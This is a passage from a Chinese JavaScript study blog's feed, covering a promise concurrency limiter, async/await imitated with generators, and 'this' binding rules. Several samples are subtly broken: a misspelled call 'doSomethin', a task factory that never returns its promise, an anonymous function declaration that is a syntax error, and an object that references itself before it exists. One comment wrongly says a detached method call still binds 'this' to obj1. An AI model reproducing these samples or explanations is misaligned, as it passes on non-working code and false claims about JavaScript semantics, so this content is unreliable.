        <content type="html"><![CDATA[<div class="note info"><p><strong>背景</strong></p><p>设计一个方法doSomething来限制异步任务的最大并发数</p></div><span id="more"></span><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span> (<span class="attr">timeout</span>: <span class="built_in">number</span>, <span class="attr">taskName</span>: <span class="built_in">string</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt;(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;taskName&#125;</span>开始啦`</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;taskName&#125;</span>结束啦`</span>);</span><br><span class="line">            <span class="title function_">resolve</span>();</span><br><span class="line">        &#125;, timeout)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tasks = [</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">1000</span>, <span class="string">&#x27;睡觉&#x27;</span>),</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">2000</span>, <span class="string">&#x27;吃饭&#x27;</span>),</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">3000</span>, <span class="string">&#x27;打游戏&#x27;</span>),</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">5000</span>, <span class="string">&#x27;写代码&#x27;</span>),</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">7000</span>, <span class="string">&#x27;做运动&#x27;</span>),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params">tasks:(()=&gt;<span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;)[], limit=<span class="number">2</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 正在执行中的任务的集合</span></span><br><span class="line">    <span class="keyword">const</span> taskPool = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> task <span class="keyword">of</span> tasks) &#123;</span><br><span class="line">        <span class="keyword">const</span> promise = <span class="title function_">task</span>();</span><br><span class="line">        taskPool.<span class="title function_">add</span>(promise);</span><br><span class="line">        promise.<span class="title function_">then</span>(<span class="function">() =&gt;</span> taskPool.<span class="title function_">delete</span>(promise));</span><br><span class="line">        <span class="keyword">if</span> (taskPool.<span class="property">size</span> &gt;= limit) &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">race</span>(taskPool);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(taskPool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 如果存在同步任务情况</span></span><br><span class="line"><span class="comment">async function doSomething(tasks:(()=&gt;Promise&lt;void&gt;)[], limit=2) &#123;</span></span><br><span class="line"><span class="comment">    // 正在执行中的任务的集合</span></span><br><span class="line"><span class="comment">    const taskPool = new Set();</span></span><br><span class="line"><span class="comment">    for (const task of tasks) &#123;</span></span><br><span class="line"><span class="comment">        const promise = task();</span></span><br><span class="line"><span class="comment">        const p = Promise.resolve(promise)  // 包装Promise, 同步任务直接返回</span></span><br><span class="line"><span class="comment">        taskPool.add(p);</span></span><br><span class="line"><span class="comment">        promise.then(() =&gt; taskPool.delete(p));</span></span><br><span class="line"><span class="comment">        if (taskPool.size &gt;= limit) &#123;</span></span><br><span class="line"><span class="comment">            await Promise.race(taskPool);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return Promise.all(taskPool);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">doSomethin</span>(tasks).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;任务全部执行完了&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载图片</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getTasks</span>(<span class="params">urls</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> tasks = [];</span><br><span class="line">    urls.<span class="title function_">forEach</span>(<span class="function"><span class="params">url</span> =&gt;</span> &#123;</span><br><span class="line">        tasks.<span class="title function_">push</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">                img.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                img.<span class="property">src</span> = url;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> tasks;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">doSomething</span>(<span class="title function_">getTasks</span>([<span class="string">&#x27;xxxx.jpg&#x27;</span>, <span class="string">&#x27;xxxx.png&#x27;</span>])).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;全部执行完了&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 加载图片</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="视频地址"><a href="#视频地址" class="headerlink" title="视频地址"></a>视频地址</h2><div class="tag link"><a class="link-card" title="【Promise的异步任务并发限制还不会写？还只会Promise.all ？今天一次性教会你实现思路与细节！】" href="ttps://www.bilibili.com/video/BV1i24y1L72L/?share_source=copy_web&vd_source=a11f39cbd36d0048998b780fa95bc7df"><div class="left"><img src="https://gcore.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">【Promise的异步任务并发限制还不会写？还只会Promise.all ？今天一次性教会你实现思路与细节！】</p><p class="url">ttps://www.bilibili.com/video/BV1i24y1L72L/?share_source=copy_web&vd_source=a11f39cbd36d0048998b780fa95bc7df</p></div></a></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async/await 学习</title>
      <link href="/ca9ee217.html"/>
      <url>/ca9ee217.html</url>
      
        <content type="html"><![CDATA[<div class="note info cyan"><p><strong></strong></p><p>async 函数可能包含 0 个或者多个 <emp>await</emp> 表达式。await 表达式会暂停整个 async 函数的执行进程并出让其控制权，只有当其等待的基于 promise 的异步操作被兑现或被拒绝之后才会恢复进程。promise 的解决值会被当作该 await 表达式的返回值。使用 <emp>async&#x2F;await</emp> 关键字就可以在异步代码中使用普通的 <emp>try&#x2F;catch</emp> 代码块。</p></div><span id="more"></span><div class="note warning"><p><strong>备注</strong></p><p><emp>await</emp>关键字只在 async 函数内有效。如果你在 async 函数体之外使用它，就会抛出语法错误 <emp>SyntaxError</emp>。</p></div><div class="note warning"><p><strong>备注</strong></p><p><emp>async&#x2F;await</emp>的目的为了简化使用基于 promise 的 API 时所需的语法。<emp>async&#x2F;await</emp> 的行为就好像搭配使用了生成器和 promise。</p></div><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">request</span> (url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(url + count ++);     </span><br><span class="line">        &#125;, <span class="number">500</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用async/await语法糖</span></span><br><span class="line"><span class="comment">// async function run () &#123;</span></span><br><span class="line"><span class="comment">//     const res1 = await request(&#x27;1111&#x27;);</span></span><br><span class="line"><span class="comment">//     const res2 = await request(res1);</span></span><br><span class="line"><span class="comment">//     console.log(res2);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// run();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于生成器函数模拟async/await</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">generate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">yield</span> <span class="title function_">request</span>(<span class="string">&#x27;1111&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> res2 = <span class="keyword">yield</span> <span class="title function_">request</span>(res);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用递归实现连续调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> g = <span class="title function_">generate</span>();</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exec</span> (params) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; value, done &#125; = g.<span class="title function_">next</span>();</span><br><span class="line">        <span class="keyword">if</span> (!done) &#123;</span><br><span class="line">            value.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="title function_">exec</span>(res));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">exec</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">run</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>this 指向</title>
      <link href="/6cfe1ad3.html"/>
      <url>/6cfe1ad3.html</url>
      
        <content type="html"><![CDATA[<details cyan><summary> this到底指向什么？ </summary>              <div class='content'>              <div class="note message light"><p>函数在调用时，JavaScript会默认给this绑定一个值</p></div><div class="note message light"><p>this的绑定和定义的位置（编写的位置）没有关系</p></div><div class="note message light"><p>this的绑定和调用方式以及调用的位置有关系</p></div><div class="note message light"><p>this是在运行时被绑定的</p></div>              </div>            </details><span id="more"></span><hr><h2 id="this-绑定规则"><a href="#this-绑定规则" class="headerlink" title="this 绑定规则"></a>this 绑定规则</h2><div class="note info"><p><strong>this的绑定规则</strong></p><ul><li><p class='p gray'>绑定一：默认绑定</p></li><li><p class='p gray'>绑定二：隐式绑定</p></li><li><p class='p gray'>绑定三：显示绑定</p></li><li><p class='p gray'>绑定四：new绑定</p></li></ul></div><h2 id="默认绑定"><a href="#默认绑定" class="headerlink" title="默认绑定"></a>默认绑定</h2><div class="note info"><p>独立的函数调用可以理解成函数没有被绑定到某个对象上进行调用</p></div><div class="note warning"><p>严格模式，独立调用的函数中的this指向的是undefined</p></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 普通函数被独立调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo &#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>();  <span class="comment">// 指向window</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 函数定义在对象中，但是独立调用</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;why&#x27;</span>,</span><br><span class="line">  <span class="attr">bar</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;bar &#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// obj.bar(); // 指向obj对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> baz = obj.<span class="property">bar</span>;</span><br><span class="line"><span class="title function_">baz</span>() <span class="comment">// 指向window</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 严格模式，独立调用的函数中的this指向的是undefined</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>()</span><br></pre></td></tr></table></figure><h4 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test1</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="title function_">test2</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test2</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="title function_">test3</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test3</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test1</span>();</span><br></pre></td></tr></table></figure><h4 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 高阶函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> (func) &#123;</span><br><span class="line">  <span class="title function_">func</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;why&#x27;</span>,</span><br><span class="line">  <span class="attr">bar</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(obj.<span class="property">bar</span>); <span class="comment">// 属于独立调用</span></span><br></pre></td></tr></table></figure><hr><h2 id="隐式绑定"><a href="#隐式绑定" class="headerlink" title="隐式绑定"></a>隐式绑定</h2><div class="note info"><p>通过某个对象进行调用；也就是它的调用位置中，是通过某个对象发起的函数调用</p></div><div class="note warning"><p><strong>隐式绑定的前提条件</strong></p><ul><li>必须<emp>在调用的对象内部有一个对函数的引用</emp>（比如一个属性）；</li><li>如果没有这样的引用，在进行调用时，会报找不到该函数的错误；</li><li>正是通过这样的引用，间接的将this绑定到这个对象上；</li></ul></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 隐式绑定</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">bar</span>: foo,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">bar</span>();  <span class="comment">// 指向obj对象</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><h4 id="案例一-1"><a href="#案例一-1" class="headerlink" title="案例一"></a>案例一</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;obj&#x27;</span>,</span><br><span class="line">  <span class="attr">foo</span>: foo,</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> obj2 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;obj2&#x27;</span>,</span><br><span class="line">  <span class="attr">obj1</span>: obj2,</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> obj2.<span class="property">obj1</span>.<span class="title function_">foo</span>(); <span class="comment">// 指向obj1对象</span></span><br></pre></td></tr></table></figure><h4 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;obj1&#x27;</span>,</span><br><span class="line">  <span class="attr">foo</span>: foo,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> bar = obj1.<span class="property">foo</span>;</span><br><span class="line"><span class="title function_">bar</span>();  <span class="comment">// 指向obj1对象</span></span><br></pre></td></tr></table></figure><hr><h2 id="显式绑定"><a href="#显式绑定" class="headerlink" title="显式绑定"></a>显式绑定</h2><div class="note info"><p>不希望在对象内部包含这个函数的引用，同时又希望在这个对象上进行强制调用；可以使用显式绑定</p></div><div class="note success"><p><strong>call和apply方法</strong></p><ul><li>第一个参数是相同的，要求传入一个对象<ul><li><u>这个对象的作用就是给this准备的</u></li><li><u>在调用这个函数时，会将this绑定到这个传入的对象上</u></li></ul></li><li>后面的参数；apply为数组，call为参数列表</li></ul></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> (name, age, height) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo 函数被调用 &#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;打印参数 &#x27;</span>, name, age, height);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ()调用</span></span><br><span class="line"><span class="comment">// foo(&#x27;why&#x27;, 18, 180);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// apply</span></span><br><span class="line"><span class="comment">// 第一个参数：绑定this</span></span><br><span class="line"><span class="comment">// 第二个参数：传入额外的实参，以数组的形式</span></span><br><span class="line"><span class="comment">// foo.apply(&#x27;apply&#x27;, [&#x27;kobe&#x27;, 30, 198])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// call</span></span><br><span class="line"><span class="comment">// 第一个参数：绑定this</span></span><br><span class="line"><span class="comment">// 第二个参数：后续的参数以多参数的形式传递，会作为实参</span></span><br><span class="line">foo.<span class="title function_">call</span>(<span class="string">&#x27;call&#x27;</span>, <span class="string">&#x27;james&#x27;</span>, <span class="number">35</span>, <span class="number">205</span>);</span><br></pre></td></tr></table></figure><h3 id="bind-的显示绑定"><a href="#bind-的显示绑定" class="headerlink" title="bind 的显示绑定"></a>bind 的显示绑定</h3><div class="note info"><p><strong></strong></p><ul><li>如果我们希望一个函数总是显式的绑定到一个对象上，可以使用 bind 方法；bind()方法创建一个新的<emp>绑定函数(bound function, BF)</emp></li><li>绑定函数是一个<emp>exotic function object(怪异函数对象，ECMAScript 2015 中的术语)</emp></li><li>在bind() 被调用时，这个新函数的this被指定为bind() 的第一个参数，而其余参数将作为新函数的参数，供调用时使用</li></ul></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> (name, age, height) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo &#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123; <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;why&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需求：调用foo时，总是绑定到obj对象身上（不希望obj对象上有函数）</span></span><br><span class="line"><span class="comment">// 1. bind函数的基本使用</span></span><br><span class="line"><span class="keyword">const</span> bar = foo.<span class="title function_">bind</span>(obj);</span><br><span class="line"><span class="title function_">bar</span>();  <span class="comment">// this --&gt; obj</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. bind函数的其他参数</span></span><br><span class="line"><span class="keyword">const</span> test = foo.<span class="title function_">bind</span>(obj, <span class="string">&#x27;kobe&#x27;</span>, <span class="number">30</span>, <span class="number">198</span>)</span><br><span class="line"><span class="title function_">test</span>() </span><br></pre></td></tr></table></figure><hr><h2 id="new绑定"><a href="#new绑定" class="headerlink" title="new绑定"></a>new绑定</h2><div class="note info"><p>JavaScript中的函数可以当做一个类的构造函数来使用，也就是使用new关键字</p></div><div class="note success"><p><strong>使用new关键字调用函数执行的操作</strong></p><ol><li>创建新的空对象；</li><li>新对象会被执行prototype连接；</li><li>新对象会绑定到函数调用的this上（this绑定在这个步骤完成）；</li><li>没有显示返回非空对象时，默认返回这个对象；</li></ol></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;why&#x27;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title function_">foo</span>();  <span class="comment">// 指向foo对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Person</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span> (name) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);  <span class="comment">// Person 